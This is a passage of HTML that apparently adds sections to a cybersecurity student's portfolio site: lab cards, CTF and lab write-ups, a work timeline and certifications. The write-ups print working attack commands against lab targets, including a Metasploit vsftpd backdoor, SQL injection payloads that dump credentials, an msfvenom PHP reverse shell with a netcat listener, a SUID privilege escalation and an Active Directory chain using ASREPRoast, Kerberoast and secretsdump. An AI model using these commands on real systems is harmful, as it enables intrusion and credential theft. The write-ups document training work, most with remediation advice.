+          <div><div class="lab-card-title">Kali Linux Pentest Lab</div><div class="lab-card-sub">VirtualBox · Isolated NAT network</div></div>
+          <span class="lab-badge lb-off">Offensive</span>
+        </div>
+        <div class="lab-card-body">
+          <div class="lab-card-desc">Multi-VM isolated attack environment: Kali Linux attacker against Metasploitable2, DVWA, bWAPP and custom VulnHub targets. Full kill-chain exercises from recon through to post-exploitation and reporting. All findings documented as professional pentest reports with CVSS scoring.</div>
+          <div class="lab-progress"><div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px"><span>Completion</span><span>90%</span></div><div class="lab-progress-bar"><div class="lab-progress-fill" style="width:90%;background:var(--red)"></div></div></div>
+          <div class="lab-tools"><span class="lab-tool">Nmap</span><span class="lab-tool">Metasploit</span><span class="lab-tool">Burp Suite</span><span class="lab-tool">Meterpreter</span><span class="lab-tool">DVWA</span><span class="lab-tool">OpenVAS</span></div>
+          <button class="lab-code-toggle" onclick="toggleCode(this)">▶ show commands</button>
+          <div class="lab-code">
+<span class="code-comment"># Phase 1: Reconnaissance</span>
+<span class="code-accent">nmap</span> -sV -sC -A -p- 10.0.0.5
+<span class="code-green">PORT   STATE SERVICE VERSION</span>
+21/tcp open  ftp     vsftpd 2.3.4
+80/tcp open  http    Apache httpd 2.2.8
+
+<span class="code-comment"># Phase 2: Exploitation (vsftpd backdoor)</span>
+<span class="code-accent">msf6</span> &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit &gt; set RHOSTS 10.0.0.5
+msf6 exploit &gt; run
+<span class="code-green">[*] Command shell session 1 opened</span>
+
+<span class="code-comment"># Phase 3: Privilege Escalation</span>
+<span class="code-accent">python3</span> -c 'import pty;pty.spawn("/bin/bash")'
+<span class="code-amber">find</span> / -perm -4000 2>/dev/null
+<span class="code-green">root@metasploitable:~#</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="lab-card">
+        <div class="lab-card-header">
+          <div><div class="lab-card-title">Web App Pentest Lab</div><div class="lab-card-sub">DVWA · bWAPP · Burp Suite Pro</div></div>
+          <span class="lab-badge lb-off">Offensive</span>
+        </div>
+        <div class="lab-card-body">
+          <div class="lab-card-desc">Dedicated web application testing environment focused on OWASP Top 10 vulnerabilities. Intercepted and manipulated HTTP traffic, identified SQLi, XSS, CSRF, IDOR, broken authentication, and insecure direct object references. Documented all findings with PoC screenshots and remediation advice.</div>
+          <div class="lab-progress"><div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px"><span>Completion</span><span>85%</span></div><div class="lab-progress-bar"><div class="lab-progress-fill" style="width:85%;background:var(--red)"></div></div></div>
+          <div class="lab-tools"><span class="lab-tool">Burp Suite</span><span class="lab-tool">SQLMap</span><span class="lab-tool">DVWA</span><span class="lab-tool">bWAPP</span><span class="lab-tool">OWASP ZAP</span></div>
+          <button class="lab-code-toggle" onclick="toggleCode(this)">▶ show commands</button>
+          <div class="lab-code">
+<span class="code-comment"># SQL Injection — manual discovery</span>
+<span class="code-amber">Input:</span> 1' ORDER BY 2-- -
+<span class="code-green">Response: 200 OK (2 columns confirmed)</span>
+
+1' UNION SELECT null,database()-- -
+<span class="code-green">Response: dvwa</span>
+
+1' UNION SELECT null,group_concat(user,0x3a,password)
+  FROM users-- -
+<span class="code-green">admin:5f4dcc3b5aa765d61d8327deb882cf99</span>
+
+<span class="code-comment"># Crack offline</span>
+<span class="code-accent">hashcat</span> -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+<span class="code-green">5f4dcc3b... : password</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="lab-card">
+        <div class="lab-card-header">
+          <div><div class="lab-card-title">Cisco Networking Lab</div><div class="lab-card-sub">Packet Tracer · GNS3 · Wireshark</div></div>
+          <span class="lab-badge lb-net">Network</span>
+        </div>
+        <div class="lab-card-body">
+          <div class="lab-card-desc">Enterprise multi-site network topology with 12+ devices. Configured OSPF/EIGRP routing, inter-VLAN routing, STP, ACLs, port security, DHCP snooping and Dynamic ARP Inspection. Simulated VLAN hopping, ARP poisoning and DHCP starvation attacks — then hardened the configuration to mitigate each.</div>
+          <div class="lab-progress"><div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px"><span>Completion</span><span>88%</span></div><div class="lab-progress-bar"><div class="lab-progress-fill" style="width:88%;background:var(--green)"></div></div></div>
+          <div class="lab-tools"><span class="lab-tool">Cisco IOS</span><span class="lab-tool">GNS3</span><span class="lab-tool">Packet Tracer</span><span class="lab-tool">Wireshark</span><span class="lab-tool">IPsec</span></div>
+          <button class="lab-code-toggle" onclick="toggleCode(this)">▶ show commands</button>
+          <div class="lab-code">
+<span class="code-comment"># VLAN security hardening</span>
+<span class="code-accent">SW1(config)#</span> interface g0/1
+SW1(config-if)# switchport mode access
+SW1(config-if)# switchport nonegotiate
+SW1(config-if)# spanning-tree bpduguard enable
+
+<span class="code-comment"># ACL — deny VLAN10 to reach management</span>
+<span class="code-accent">R1(config)#</span> ip access-list extended VLAN10-RESTRICT
+R1(config-ext-nacl)# deny ip 192.168.10.0 0.0.0.255 10.0.0.0 0.0.0.255
+R1(config-ext-nacl)# permit ip any any
+
+<span class="code-comment"># IPsec VPN tunnel — site to site</span>
+<span class="code-accent">R1(config)#</span> crypto isakmp policy 10
+R1(config-isakmp)# encryption aes 256
+<span class="code-green">VPN tunnel established successfully</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="lab-card">
+        <div class="lab-card-header">
+          <div><div class="lab-card-title">Digital Forensics Lab</div><div class="lab-card-sub">Autopsy · FTK Imager · Volatility</div></div>
+          <span class="lab-badge lb-for">DFIR</span>
+        </div>
+        <div class="lab-card-body">
+          <div class="lab-card-desc">Disk image acquisition and forensic analysis on simulated compromised Windows 10 systems. Recovered deleted files, browser artefacts, email headers and registry hives. Memory forensics with Volatility on captured RAM dumps — extracted malicious processes, injected DLLs and C2 beacons. Wireshark PCAP analysis for network-level IOC extraction.</div>
+          <div class="lab-progress"><div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px"><span>Completion</span><span>82%</span></div><div class="lab-progress-bar"><div class="lab-progress-fill" style="width:82%;background:var(--accent3)"></div></div></div>
+          <div class="lab-tools"><span class="lab-tool">Autopsy</span><span class="lab-tool">FTK Imager</span><span class="lab-tool">Volatility3</span><span class="lab-tool">Wireshark</span><span class="lab-tool">VirusTotal</span></div>
+          <button class="lab-code-toggle" onclick="toggleCode(this)">▶ show commands</button>
+          <div class="lab-code">
+<span class="code-comment"># Volatility3 — memory analysis</span>
+<span class="code-accent">python3</span> vol.py -f memory.dmp windows.pslist
+<span class="code-amber">PID  PPID  Name        Offset</span>
+3412 1234  svchost.exe <span class="code-red">0x... (spawned from explorer!)</span>
+
+<span class="code-accent">python3</span> vol.py -f memory.dmp windows.malfind
+<span class="code-red">PID 3412: Injected shellcode detected</span>
+<span class="code-red">MZ header found in non-image region</span>
+
+<span class="code-accent">python3</span> vol.py -f memory.dmp windows.netscan
+<span class="code-green">ESTABLISHED 192.168.1.50:49234</span>
+<span class="code-red">           → 185.220.101.x:4444 (C2!)</span>
+
+<span class="code-comment"># Hash IOC to VirusTotal</span>
+<span class="code-green">Detection: 48/72 — Cobalt Strike beacon</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="lab-card">
+        <div class="lab-card-header">
+          <div><div class="lab-card-title">ARDUN Technologies — SDV Security</div><div class="lab-card-sub">Real engagement · ISO/SAE 21434</div></div>
+          <span class="lab-badge lb-real">Real Engagement</span>
+        </div>
+        <div class="lab-card-body">
+          <div class="lab-card-desc">77.5-hour real-world work-integrated learning project. Conducted Threat Analysis and Risk Assessment (TARA) for a Software-Defined Vehicle platform under ISO/SAE 21434. Evaluated 15+ threat scenarios against Hardware Abstraction Layer and Service Logic components. Designed Kubernetes K3s validation framework with Robot Framework achieving 100% test reliability.</div>
+          <div class="lab-progress"><div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px"><span>Completion</span><span>100%</span></div><div class="lab-progress-bar"><div class="lab-progress-fill" style="width:100%;background:var(--amber)"></div></div></div>
+          <div class="lab-tools"><span class="lab-tool">ISO/SAE 21434</span><span class="lab-tool">TARA</span><span class="lab-tool">Kubernetes K3s</span><span class="lab-tool">Docker</span><span class="lab-tool">Robot Framework</span><span class="lab-tool">Git</span></div>
+          <button class="lab-code-toggle" onclick="toggleCode(this)">▶ show TARA output</button>
+          <div class="lab-code">
+<span class="code-comment"># TARA — Threat scenarios evaluated</span>
+<span class="code-amber">Asset:</span> HAL (Hardware Abstraction Layer)
+<span class="code-amber">Threat:</span> Unauthorised firmware injection
+<span class="code-amber">Attack vector:</span> OBD-II port / CAN bus
+<span class="code-red">Risk rating: HIGH (Impact: Safety-critical)</span>
+<span class="code-green">Mitigation: Code signing + secure boot</span>
+
+<span class="code-amber">Asset:</span> Service Logic Component
+<span class="code-amber">Threat:</span> Remote code execution via API
+<span class="code-amber">Attack vector:</span> Telematics / OTA update
+<span class="code-red">Risk rating: CRITICAL</span>
+<span class="code-green">Mitigation: mTLS + API gateway + rate limiting</span>
+
+<span class="code-comment"># K3s validation test result</span>
+<span class="code-green">✓ Namespace isolation: PASS</span>
+<span class="code-green">✓ RBAC enforcement: PASS</span>
+<span class="code-green">✓ Network policy: PASS</span>
+<span class="code-green">Test reliability: 100%</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="lab-card">
+        <div class="lab-card-header">
+          <div><div class="lab-card-title">Tanasiom Aegis</div><div class="lab-card-sub">Founder · Cyber Essentials Toolkit</div></div>
+          <span class="lab-badge lb-def">GRC Project</span>
+        </div>
+        <div class="lab-card-body">
+          <div class="lab-card-desc">Founded Jul 2025. A web-based Cyber Essentials readiness assessment tool for UK SMEs — filling a gap in accessible pre-certification guidance. Designed a structured questionnaire and scoring model across 5 compliance domains. Aligned to NCSC, IASME and UK GDPR. Built as a web prototype using modular, data-driven architecture with Agile methodology. Long-term goal: full cybersecurity compliance consultancy.</div>
+          <div class="lab-progress"><div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--text3);margin-bottom:4px"><span>Completion</span><span>65%</span></div><div class="lab-progress-bar"><div class="lab-progress-fill" style="width:65%;background:var(--accent2)"></div></div></div>
+          <div class="lab-tools"><span class="lab-tool">Python</span><span class="lab-tool">HTML/CSS/JS</span><span class="lab-tool">NCSC</span><span class="lab-tool">IASME</span><span class="lab-tool">UK GDPR</span><span class="lab-tool">Cyber Essentials</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- WRITEUPS -->
+<section id="writeups" style="background:var(--bg2)">
+  <div class="container">
+    <div class="section-header fade-in">
+      <div class="section-label">methodology & documentation</div>
+      <h2 class="section-title">Technical <span>Write-ups</span></h2>
+    </div>
+    <div class="writeup-list fade-in">
+
+      <div class="writeup-item" onclick="toggleWriteup(this)">
+        <div class="writeup-header">
+          <span class="writeup-num">01</span>
+          <span class="writeup-title">HTB Machine — Linux Privilege Escalation via SUID Binary</span>
+          <div class="writeup-tags"><span class="lab-badge lb-off">HTB</span><span class="lab-badge lb-off">Priv Esc</span></div>
+          <span class="writeup-arrow">▶</span>
+        </div>
+        <div class="writeup-body">
+          <div class="writeup-section"><div class="ws-label">objective</div><div class="ws-text">Root a Linux target machine via service enumeration, initial access through a vulnerable web application, and privilege escalation using a misconfigured SUID binary.</div></div>
+          <div class="writeup-section"><div class="ws-label">phase 1 — reconnaissance</div><div class="ws-text">Full port scan revealed SSH (22), HTTP (80) and an unusual service on port 8080. Nikto and Gobuster identified a hidden admin panel at /admin with default credentials admin:admin.</div><div class="code-block"><span class="code-accent">nmap</span> -sV -sC -p- --min-rate 5000 10.10.11.x<br><span class="code-accent">gobuster</span> dir -u http://10.10.11.x -w /usr/share/wordlists/dirbuster/medium.txt<br><span class="code-green">Found: /admin (Status: 200)</span><br><span class="code-green">Found: /backup (Status: 403)</span></div></div>
+          <div class="writeup-section"><div class="ws-label">phase 2 — initial access</div><div class="ws-text">Admin panel had a file upload function with insufficient validation. Uploaded a PHP reverse shell disguised with double extension (.php.jpg). Started Netcat listener, triggered the shell.</div><div class="code-block"><span class="code-amber">msfvenom</span> -p php/reverse_php LHOST=10.10.14.x LPORT=4444 -f raw -o shell.php.jpg<br><span class="code-accent">nc</span> -lvnp 4444<br><span class="code-green">[+] Connection received from 10.10.11.x</span><br>$ whoami → www-data</div></div>
+          <div class="writeup-section"><div class="ws-label">phase 3 — privilege escalation</div><div class="ws-text">Enumerated SUID binaries. Found /usr/bin/find with SUID bit set. Used GTFOBins technique to escalate to root.</div><div class="code-block"><span class="code-accent">find</span> / -perm -4000 -type f 2>/dev/null<br><span class="code-red">/usr/bin/find (SUID — vulnerable!)</span><br><span class="code-accent">find</span> . -exec /bin/bash -p \; -quit<br><span class="code-green">bash-5.1# whoami → root</span><br><span class="code-green">bash-5.1# cat /root/root.txt → [FLAG CAPTURED]</span></div></div>
+          <div class="writeup-section"><div class="ws-label">remediation</div><div class="ws-text">Remove SUID bit from /usr/bin/find. Implement file upload validation (whitelist extensions, check MIME type, store outside webroot). Change default admin credentials. Disable directory listing.</div></div>
+        </div>
+      </div>
+
+      <div class="writeup-item" onclick="toggleWriteup(this)">
+        <div class="writeup-header">
+          <span class="writeup-num">02</span>
+          <span class="writeup-title">SQL Injection — Manual Exploitation &amp; Data Extraction</span>
+          <div class="writeup-tags"><span class="lab-badge lb-off">Web App</span><span class="lab-badge lb-off">SQLi</span></div>
+          <span class="writeup-arrow">▶</span>
+        </div>
+        <div class="writeup-body">
+          <div class="writeup-section"><div class="ws-label">target</div><div class="ws-text">DVWA (Damn Vulnerable Web Application) running on local lab instance, security level: low. Goal: extract the entire user database including password hashes.</div></div>
+          <div class="writeup-section"><div class="ws-label">discovery &amp; enumeration</div><div class="ws-text">Input field in user search parameter. Tested with single quote — received MySQL syntax error confirming injection point. Determined number of columns with ORDER BY.</div><div class="code-block">1' -- -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-green">→ MySQL error (injection confirmed)</span><br>1' ORDER BY 1-- -&nbsp;<span class="code-green">→ 200 OK</span><br>1' ORDER BY 2-- -&nbsp;<span class="code-green">→ 200 OK</span><br>1' ORDER BY 3-- -&nbsp;<span class="code-red">→ Error (2 columns confirmed)</span></div></div>
+          <div class="writeup-section"><div class="ws-label">exploitation</div><div class="ws-text">Used UNION SELECT to extract database name, enumerate tables, then dump the users table.</div><div class="code-block">1' UNION SELECT null,database()-- -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-green">→ dvwa</span><br>1' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa'-- -<br><span class="code-green">→ guestbook,users</span><br>1' UNION SELECT null,group_concat(user,0x3a,password) FROM users-- -<br><span class="code-green">→ admin:5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="code-accent">hashcat</span> -m 0 hash.txt rockyou.txt&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-green">→ password</span></div></div>
+          <div class="writeup-section"><div class="ws-label">impact &amp; remediation</div><div class="ws-text">Full database read access. All user credentials exposed. Fix: use parameterised queries / prepared statements, implement WAF, hash passwords with bcrypt (not MD5), apply principle of least privilege on DB user.</div></div>
+        </div>
+      </div>
+
+      <div class="writeup-item" onclick="toggleWriteup(this)">
+        <div class="writeup-header">
+          <span class="writeup-num">03</span>
+          <span class="writeup-title">Memory Forensics — Cobalt Strike Beacon Detection</span>
+          <div class="writeup-tags"><span class="lab-badge lb-for">DFIR</span><span class="lab-badge lb-for">Malware</span></div>
+          <span class="writeup-arrow">▶</span>
+        </div>
+        <div class="writeup-body">
+          <div class="writeup-section"><div class="ws-label">scenario</div><div class="ws-text">Simulated IR scenario: Windows 10 endpoint reported unusual outbound connections. Memory dump provided for analysis. Goal: identify the malware, extract IOCs, and establish timeline of compromise.</div></div>
+          <div class="writeup-section"><div class="ws-label">process analysis</div><div class="ws-text">Volatility3 pslist revealed svchost.exe spawned from explorer.exe — anomalous (should be services.exe). Malfind identified injected shellcode with MZ header in non-image memory region of PID 3412.</div><div class="code-block">python3 vol.py -f memory.dmp windows.pslist | grep svchost<br><span class="code-red">3412  1204  svchost.exe  (PPID: explorer.exe — ANOMALY!)</span><br>python3 vol.py -f memory.dmp windows.malfind -p 3412<br><span class="code-red">Injected code detected: MZ header in VAD region</span><br><span class="code-red">Shellcode signature matches Cobalt Strike stager</span></div></div>
+          <div class="writeup-section"><div class="ws-label">network analysis</div><div class="ws-text">Netscan showed established outbound connection to known C2 IP on port 443 using HTTPS to blend with legitimate traffic. Beacon interval: 60 seconds with 20% jitter.</div><div class="code-block">python3 vol.py -f memory.dmp windows.netscan<br><span class="code-red">ESTABLISHED 192.168.1.50:52341 → 185.220.101.47:443</span><br><span class="code-amber">Beacon interval: ~60s ±12s (20% jitter)</span><br><span class="code-red">IOC: 185.220.101.47 — known Cobalt Strike C2</span></div></div>
+          <div class="writeup-section"><div class="ws-label">IOCs extracted</div><div class="ws-text">C2 IP: 185.220.101.47 · Process: svchost.exe PID 3412 · Parent: explorer.exe PID 1204 · Mutex: {GUID} · DLL hash: [SHA256] — 48/72 VirusTotal detections as Cobalt Strike.</div></div>
+        </div>
+      </div>
+
+      <div class="writeup-item" onclick="toggleWriteup(this)">
+        <div class="writeup-header">
+          <span class="writeup-num">04</span>
+          <span class="writeup-title">Network PCAP Analysis — C2 Beaconing &amp; DNS Exfiltration</span>
+          <div class="writeup-tags"><span class="lab-badge lb-net">Network</span><span class="lab-badge lb-for">DFIR</span></div>
+          <span class="writeup-arrow">▶</span>
+        </div>
+        <div class="writeup-body">
+          <div class="writeup-section"><div class="ws-label">scenario</div><div class="ws-text">Analysed a 50MB PCAP capture from a simulated corporate network. Suspected compromise based on performance degradation and unusual DNS queries reported by network admin.</div></div>
+          <div class="writeup-section"><div class="ws-label">C2 beacon detection</div><div class="ws-text">Filtered HTTP POST requests — identified regular beaconing every 60 seconds to a single external IP. Base64-encoded payloads in the User-Agent string, consistent with Cobalt Strike HTTP profile.</div><div class="code-block">tshark -r capture.pcap -Y "http.request.method==POST"<br><span class="code-red">Regular intervals: 60.0s ±12s → C2 beacon pattern</span><br>tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.user_agent<br><span class="code-red">Mozilla/5.0 ... (dWVyYWdlbnQ= base64 encoded payload)</span></div></div>
+          <div class="writeup-section"><div class="ws-label">DNS exfiltration</div><div class="ws-text">DNS queries showed high-entropy subdomain requests — DGA (Domain Generation Algorithm) pattern. Large volume of NXDomain responses confirmed data being encoded in DNS labels.</div><div class="code-block">tshark -r capture.pcap -Y "dns" | awk '{print $12}' | sort | uniq -c | sort -rn<br><span class="code-red">High-entropy subdomains: a3f8b2c1d4.exfil-domain.com</span><br><span class="code-red">DGA pattern confirmed — 847 unique subdomains in 2 hours</span><br><span class="code-red">Estimated data exfiltrated: ~2.4MB via DNS tunnelling</span></div></div>
+        </div>
+      </div>
+
+      <div class="writeup-item" onclick="toggleWriteup(this)">
+        <div class="writeup-header">
+          <span class="writeup-num">05</span>
+          <span class="writeup-title">Active Directory Attack Chain — Enumeration to DA</span>
+          <div class="writeup-tags"><span class="lab-badge lb-off">AD</span><span class="lab-badge lb-off">Internal</span></div>
+          <span class="writeup-arrow">▶</span>
+        </div>
+        <div class="writeup-body">
+          <div class="writeup-section"><div class="ws-label">scenario</div><div class="ws-text">Internal network pentest simulation against a Windows AD lab environment. Starting with low-privilege user credentials. Goal: escalate to Domain Admin.</div></div>
+          <div class="writeup-section"><div class="ws-label">enumeration</div><div class="ws-text">BloodHound ingestion revealed a path to Domain Admin via a Kerberoastable service account with weak password. ASREPRoasting identified a user with "Do not require Kerberos pre-authentication" set.</div><div class="code-block"><span class="code-accent">bloodhound-python</span> -u user -p pass -d lab.local -ns 10.0.0.1 -c all<br><span class="code-green">Path found: user → svc_backup → Domain Admins</span><br><span class="code-accent">impacket-GetNPUsers</span> lab.local/ -usersfile users.txt -no-pass<br><span class="code-green">$krb5asrep$23$asrep_user@LAB.LOCAL:...</span></div></div>
+          <div class="writeup-section"><div class="ws-label">exploitation</div><div class="ws-text">Cracked ASREPRoast hash offline. Used resulting credentials to Kerberoast service account. Cracked TGS offline. Used svc_backup membership to DCSync and dump NTLM hashes.</div><div class="code-block"><span class="code-accent">hashcat</span> -m 18200 asrep_hash.txt rockyou.txt<br><span class="code-green">Password: Welcome2023!</span><br><span class="code-accent">impacket-secretsdump</span> lab.local/svc_backup:Welcome2023!@10.0.0.1<br><span class="code-green">Administrator:500:aad3... ← Domain Admin NTLM</span></div></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- EXPERIENCE -->
+<section id="experience">
+  <div class="container">
+    <div class="section-header fade-in">
+      <div class="section-label">professional history</div>
+      <h2 class="section-title">Experience &amp; <span>Timeline</span></h2>
+    </div>
+    <div class="timeline fade-in">
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">JAN 2026 – PRESENT</div><div class="tl-title">Cyber Security Legal Consultant — Virtual Internship</div><div class="tl-company">Clifford Chance · London (Remote)</div><div class="tl-desc">Advised on ICO Dawn Raid response, GDPR Articles 33 & 34 breach notification, and incident containment under UK DPA 2018. Produced client-ready legal guidance for three real cyber incident scenarios including a major eCommerce data breach and a data centre ransomware response. Demonstrated how cybersecurity intersects with legal liability and regulatory enforcement.</div><div class="tl-tags"><span class="stag">GDPR</span><span class="stag">UK DPA 2018</span><span class="stag">ICO enforcement</span><span class="stag">Incident response</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">OCT 2025 – PRESENT</div><div class="tl-title">Cybersecurity Analyst Intern</div><div class="tl-company">ARDUN Technologies · Ontario, Canada (Remote)</div><div class="tl-desc">77.5-hour work-integrated learning project. Conducted ISO/SAE 21434 TARA across SDV platform — evaluated 15+ threat scenarios. Designed and implemented Kubernetes K3s validation framework using Robot Framework (100% test reliability). Built Docker-based security testing CI/CD infrastructure. Produced audit-ready traceability documentation.</div><div class="tl-tags"><span class="stag">ISO/SAE 21434</span><span class="stag">TARA</span><span class="stag">Kubernetes</span><span class="stag">Docker</span><span class="stag">Robot Framework</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">JUL 2025 – PRESENT</div><div class="tl-title">Founder & CEO — Tanasiom Aegis</div><div class="tl-company">Tanasiom Aegis · Coventry, UK</div><div class="tl-desc">Founded a Cyber Essentials readiness consultancy for UK SMEs. Designed and built a web-based assessment toolkit covering 5 compliance domains. Acting as product owner, technical lead and compliance strategist. Long-term vision: full cybersecurity compliance consultancy supporting SMEs with structured assessments and certification preparation.</div><div class="tl-tags"><span class="stag">Cyber Essentials</span><span class="stag">NCSC</span><span class="stag">IASME</span><span class="stag">Founder</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">APR 2025 – PRESENT</div><div class="tl-title">Trainee Prison Custody Officer</div><div class="tl-company">HMP Fosse Way · HMPPS</div><div class="tl-desc">High-security environment with strict procedural compliance. Cell inspections, risk assessments, P-NOMIS documentation, GDPR-aware data handling. Conflict de-escalation, SIA-approved restraint, PPE including CSRE hoods. Key-worker welfare duties and multi-agency stakeholder liaison.</div><div class="tl-tags"><span class="stag">Security operations</span><span class="stag">GDPR</span><span class="stag">Risk assessment</span><span class="stag">SIA</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">JAN 2025 – PRESENT</div><div class="tl-title">Security Operative — Critical National Infrastructure</div><div class="tl-company">Amulet Security @ Severn Trent Water · Coventry</div><div class="tl-desc">24/7 CCTV surveillance across 3 water treatment sites using thermal cameras and SecureGuard motion sensors. Configured AJAX alarm systems. Quarterly social engineering assessments (tailgating, phishing simulations). Authored SIA-audit-compliant incident reports. 25% reduction in emergency response times.</div><div class="tl-tags"><span class="stag">CCTV</span><span class="stag">AJAX alarms</span><span class="stag">Social engineering</span><span class="stag">Critical infrastructure</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">APR – OCT 2024</div><div class="tl-title">Strategic Recruitment Consultant (ERP & IT)</div><div class="tl-company">CoreERP Solutions · Remote</div><div class="tl-desc">Placed 45 ERP candidates in 6 months. Power BI pipeline dashboards. Level 1 Workday technical support. 30% placement improvement. Generated £50K in new service contracts.</div><div class="tl-tags"><span class="stag">Power BI</span><span class="stag">Workday</span><span class="stag">Data analysis</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">JAN – SEP 2023</div><div class="tl-title">Service Desk Analyst — Sage ERP Specialist</div><div class="tl-company">CPiO Limited · Remote</div><div class="tl-desc">Level 1/2 support for 150+ users across Sage CRM, Sage X3, Salesforce. Active Directory administration (MFA, GPO, provisioning) for 300+ users. ITIL via Zendesk/Jira. 95%+ CSAT. 40 tickets/day. 25+ KB articles. Supported ISO compliance during ERP migration.</div><div class="tl-tags"><span class="stag">Active Directory</span><span class="stag">ITIL</span><span class="stag">Sage ERP</span><span class="stag">ISO compliance</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">2022</div><div class="tl-title">BSc Cyber Security & Networking — Commenced</div><div class="tl-company">London Metropolitan University</div><div class="tl-desc">Key modules: Cybersecurity in Computing, Cloud & IoT Security, Risk & Crisis Management, Network Enumeration & Vulnerability Scanning, Data Analytics & Visualisation, Machine Learning. Graduating 2026.</div><div class="tl-tags"><span class="stag">Cybersecurity</span><span class="stag">Networking</span><span class="stag">Data analytics</span><span class="stag">Machine learning</span></div></div>
+      <div class="tl-item"><div class="tl-dot"></div><div class="tl-date">2018 – 2019</div><div class="tl-title">System Administrator</div><div class="tl-company">Clipper Logistics plc</div><div class="tl-desc">Maintained IT infrastructure across a 200,000 sq ft warehouse — RFID systems, barcode scanners, WMS workstations, label printers. Sub-2% downtime. Reduced mislabelling by 15% through process improvement.</div><div class="tl-tags"><span class="stag">Sysadmin</span><span class="stag">RFID</span><span class="stag">WMS</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- CERTS -->
+<section id="certs" style="background:var(--bg2)">
+  <div class="container">
+    <div class="section-header fade-in">
+      <div class="section-label">credentials</div>
+      <h2 class="section-title">Certifications &amp; <span>Training</span></h2>
+    </div>
+    <div class="cert-grid fade-in">
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(0,119,255,0.15);color:#378ADD">R</div><div><div class="cert-name">CRISC</div><div class="cert-issuer">ISACA — Risk & Information Systems Control</div><div class="cert-status cs-active">● Active</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(255,170,0,0.15);color:var(--amber)">A</div><div><div class="cert-name">AWS SAA-C03</div><div class="cert-issuer">Amazon Web Services — Solutions Architect Associate</div><div class="cert-status cs-active">● Active</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(0,255,157,0.1);color:var(--green)">C</div><div><div class="cert-name">CompTIA Ethical Hacking</div><div class="cert-issuer">CompTIA — Offensive security fundamentals</div><div class="cert-status cs-active">● Active</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(123,47,255,0.15);color:var(--accent3)">I</div><div><div class="cert-name">IIBA Data Analytics for Business</div><div class="cert-issuer">International Institute of Business Analysis</div><div class="cert-status cs-active">● Active</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(0,200,255,0.1);color:var(--accent)">T</div><div><div class="cert-name">TryHackMe — Jr Penetration Tester</div><div class="cert-issuer">TryHackMe learning path — completed</div><div class="cert-status cs-active">● Completed</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(0,200,255,0.1);color:var(--accent)">T</div><div><div class="cert-name">TryHackMe — SOC Level 1</div><div class="cert-issuer">TryHackMe learning path — completed</div><div class="cert-status cs-active">● Completed</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(0,200,255,0.1);color:var(--accent)">T</div><div><div class="cert-name">TryHackMe — Red Teaming</div><div class="cert-issuer">TryHackMe learning path — completed</div><div class="cert-status cs-active">● Completed</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(0,200,255,0.1);color:var(--accent)">T</div><div><div class="cert-name">TryHackMe — DFIR</div><div class="cert-issuer">Digital Forensics & Incident Response path</div><div class="cert-status cs-active">● Completed</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(255,64,96,0.1);color:var(--red)">S</div><div><div class="cert-name">CompTIA Security+</div><div class="cert-issuer">CompTIA — security fundamentals</div><div class="cert-status cs-progress">◐ In Progress</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(255,170,0,0.1);color:var(--amber)">e</div><div><div class="cert-name">eJPT / PNPT</div><div class="cert-issuer">eLearnSecurity / TCM Security</div><div class="cert-status cs-progress">◐ Next target</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(255,64,96,0.15);color:var(--red)">O</div><div><div class="cert-name">OSCP</div><div class="cert-issuer">Offensive Security — 12 month goal</div><div class="cert-status cs-planned">○ Planned</div></div></div>
+      <div class="cert-card"><div class="cert-icon" style="background:rgba(255,170,0,0.1);color:var(--amber)">S</div><div><div class="cert-name">SIA Security Licence</div><div class="cert-issuer">Security Industry Authority — Door Supervisor</div><div class="cert-status cs-active">● Active</div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<section id="contact">
+  <div class="container">
+    <div class="section-header fade-in">
+      <div class="section-label">get in touch</div>
+      <h2 class="section-title">Contact &amp; <span>Availability</span></h2>
+    </div>
+    <div class="contact-grid fade-in">
+      <div class="contact-info">
